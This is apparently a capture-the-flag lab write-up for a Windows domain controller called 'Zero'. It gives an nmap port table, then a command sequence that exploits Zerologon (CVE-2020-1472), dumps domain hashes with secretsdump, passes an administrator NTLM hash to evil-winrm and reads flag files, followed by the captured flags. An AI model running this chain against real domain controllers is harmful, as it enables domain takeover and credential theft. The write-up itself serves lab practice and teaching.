# Zero

**IP Address:** 172.31.1.29

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49667/tcp | open | msrpc | Microsoft Windows RPC  |
| 49673/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49674/tcp | open | msrpc | Microsoft Windows RPC  |
| 49681/tcp | open | msrpc | Microsoft Windows RPC  |
| 49705/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 135/udp | open|filtered | msrpc |   |
| 137/udp | open | netbios-ns | Microsoft Windows or Samba netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 139/udp | open|filtered | netbios-ssn |   |
| 1434/udp | open|filtered | ms-sql-m |   |
| 161/udp | open|filtered | snmp |   |
| 162/udp | open|filtered | snmptrap |   |
| 1900/udp | open|filtered | upnp |   |
| 445/udp | open|filtered | microsoft-ds |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 49152/udp | open|filtered | unknown |   |
| 500/udp | open|filtered | isakmp |   |
| 514/udp | open|filtered | syslog |   |
| 520/udp | open|filtered | route |   |
| 53/udp | open | domain |   |
| 631/udp | open|filtered | ipp |   |
| 67/udp | open|filtered | dhcps |   |
| 68/udp | open|filtered | dhcpc |   |
| 69/udp | open|filtered | tftp |   |

## Exploitation
### Exploit Details (Github)
* **Name** - Zerologon
* **CVE** - 2020-1472
* **Module** - N/A
* **Disclosed** - 2020-08-17
* **References**
  * https://github.com/VoidSec/CVE-2020-1472
  * https://nvd.nist.gov/vuln/detail/cve-2020-1472


Commands
```
python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC
secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29
evil-winrm -i $ip -u administrator -H 36242e2cb0b26d16fafd267f39ccf990
type C:\Users\jared\Desktop\access.txt
type ..\Desktop\system.txt
whoami
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

## Loot
```
access.txt
d839c4ab769c3bb84207b7ec6808b1e2
system.txt
ba08f724b22cd1d3cf890e45b3acd4de
```